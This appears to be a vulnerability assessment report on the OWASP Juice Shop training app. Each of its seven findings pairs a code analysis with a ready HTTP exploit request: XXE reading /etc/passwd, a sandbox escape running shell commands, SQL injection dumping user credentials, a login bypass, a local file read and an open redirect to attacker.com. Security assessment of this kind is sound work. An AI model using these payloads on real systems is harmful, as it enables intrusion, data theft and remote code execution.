Title: XML External Entity (XXE) Injection in XML File Upload
Analysis:
In routes/fileUpload.ts, the function `handleXmlUpload` processes uploaded XML files. If the file ends with `.xml`, it reads the buffer as string and parses it using `libxmljs2` via:
`vm.runInContext('libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })', sandbox, { timeout: 2000 })`

Crucially, the parsing options configured are: `{ noblanks: true, noent: true, nocdata: true }`.
The option `noent: true` stands for 'substitute entities' (enable entity substitution). By setting `noent: true`, the XML parser is explicitly instructed to expand external entities, allowing XML External Entity (XXE) injection. An attacker can upload a malicious XML document containing an external entity referencing local files (e.g. `file:///etc/passwd` or `file:///C:/Windows/win.ini`), and the parsed XML string returned (which is reflected in the error response: `'B2B customer complaints via file upload have been deprecated for security reasons: ' + utils.trunc(xmlString, 400)...`) will contain the contents of that local file.

Conceptual Exploit Payload:
POST /file-upload HTTP/1.1
Host: localhost:3000
Content-Type: multipart/form-data; boundary=boundary

--boundary
Content-Disposition: form-data; name="file"; filename="xxe.xml"
Content-Type: text/xml

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
--boundary--

Title: Remote Code Execution via Sandbox Escape in safeEval/notevil (B2B Order Route)
Analysis:
In routes/b2bOrder.ts, the route evaluates the user input `body.orderLinesData` using `notevil` via Node's `vm` module:
`vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })`

Although `notevil` attempts to safely evaluate JavaScript code, it is well-known that `notevil` has sandbox escape vulnerabilities. An attacker can escape the sandbox to execute arbitrary system commands or run malicious Node.js code, leading to Remote Code Execution (RCE). For example, accessing constructors of objects or function prototypes allows escaping the sandbox restriction.

Conceptual Exploit Payload:
POST /b2b/v2/orders HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Authorization: Bearer <valid_jwt>

{
  "cid": 1,
  "orderLinesData": "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"
}

Title: SQL Injection in Product Search Route
Analysis:
In routes/search.ts, the product search API uses dynamic query string interpolation:
`models.sequelize.query(\`SELECT * FROM Products WHERE ((name LIKE '%\${criteria}%' OR description LIKE '%\${criteria}%') AND deletedAt IS NULL) ORDER BY name\`)"`

The input `req.query.q` is truncated to 200 characters but remains unescaped and unparameterized. This allows arbitrary SQL commands to be executed via UNION-based SQL injections, enabling attackers to leak tables, schemas, and credentials from other database tables (such as `Users`).

Conceptual Exploit Payload:
GET /rest/products/search?q=apple%25') UNION SELECT 1,id,email,password,4,5,6,7,8,9 FROM Users -- HTTP/1.1
Host: localhost:3000

Title: SQL Injection in User Login Route
Analysis:
In routes/login.ts, the login route performs user authentication by dynamically building a SQL query using string interpolation:
`models.sequelize.query(\`SELECT * FROM Users WHERE email = '\${req.body.email || ''}' AND password = '\${security.hash(req.body.password || '')}' AND deletedAt IS NULL\`, { model: UserModel, plain: true })`

Since the input `req.body.email` is not parameterized, sanitized, or validated, an attacker can input arbitrary SQL statements (SQL Injection). For example, providing `' OR 1=1 --` allows bypassing authentication entirely.

Conceptual Exploit Payload:
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "email": "admin@juice-sh.op'--",
  "password": "any"
}

Title: Local File Inclusion / Local File Read via Layout Parameter in Data Erasure Form
Analysis:
In routes/dataErasure.ts, the POST handler allows the user to specify a `layout` parameter in `req.body.layout`. 

The layout path is resolved using `path.resolve(req.body.layout).toLowerCase()`, and checked to ensure it does not include `'ftp'`, `'ctf.key'`, or `'encryptionkeys'`. 

If it passes, it is passed to Express's `res.render('dataErasureResult', { ...req.body }, callback)` via the spread operator `...req.body`, which passes the user-supplied `layout` parameter directly to the rendering engine. In Express/HBS, the template engine uses `layout` to find the outer layout file, effectively rendering the file contents.

By providing a target local file path as the `layout` option (e.g. `layout: '../../package.json'` or absolute paths), an attacker can read arbitrary files. The backend slices the first 100 characters of the rendered html and sends it to the client: `const sendlfrResponse: string = html.slice(0, 100) + '......'`. This allows Local File Inclusion / Local File Read of files like `/etc/passwd` or application config files.

Conceptual Exploit Payload:
POST /dataerasure HTTP/1.1
Host: localhost:3000
Content-Type: application/json
Cookie: token=<valid_user_jwt>

{
  "email": "user@juice-sh.op",
  "securityAnswer": "my_answer",
  "layout": "../../package.json"
}

Title: Open Redirect Vulnerability in Redirect Route
Analysis:
In routes/redirect.ts, the function `isRedirectAllowed` checks if a URL is permitted for redirection by iterating over an allowlist and checking if the user-supplied URL contains any allowed URL (i.e. using `url.includes(allowedUrl)`).

Because it uses `includes` rather than verifying that the URL strictly matches or belongs to a safe domain, an attacker can bypass this restriction. For example, the allowlist contains `https://github.com/juice-shop/juice-shop`. An attacker can construct a malicious URL such as `https://attacker.com/bypass?https://github.com/juice-shop/juice-shop` or `http://attacker.com/https://github.com/juice-shop/juice-shop`. Since this URL contains `https://github.com/juice-shop/juice-shop`, `security.isRedirectAllowed` returns true, allowing an open redirect to arbitrary untrusted external sites.

Conceptual Exploit Payload:
GET /redirect?to=https://attacker.com/bypass?https://github.com/juice-shop/juice-shop HTTP/1.1
Host: localhost:3000

Title: Weak Substring Matching Validation for Redirects
Analysis:
In lib/insecurity.ts, the function `isRedirectAllowed` validates redirect targets by checking if the URL string contains any value from `redirectAllowlist` as a substring (i.e. `url.includes(allowedUrl)`).

This substring matching is highly insecure because an attacker can append or prepend any domain from the allowlist as a parameter or subpath in their own domain (e.g., `https://attacker.com/?https://github.com/juice-shop/juice-shop`), which bypasses the redirect control and enables open redirect vulnerabilities.

Conceptual Exploit Payload:
GET /redirect?to=https://attacker.com/?https://github.com/juice-shop/juice-shop HTTP/1.1
Host: localhost:3000
